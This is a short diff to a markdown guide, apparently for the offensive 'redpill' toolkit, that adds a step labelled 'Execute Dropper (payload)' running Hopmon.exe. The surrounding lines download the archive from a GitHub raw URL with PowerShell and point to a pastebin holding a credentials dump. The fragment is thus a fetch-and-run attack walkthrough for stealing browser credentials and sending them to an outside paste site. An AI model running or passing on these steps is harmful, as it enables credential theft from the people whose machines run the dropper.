@@ -278,6 +278,13 @@ Winget -v
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/Hopmon.rar" -OutFile "Hopmon.rar"
 ```
 
+<br />
+
+**Execute Dropper (payload)**
+```powershell
+.\Hopmon.exe
+```
+
 <br /><br />
 
 **Access pastebin to review credentials dump:**
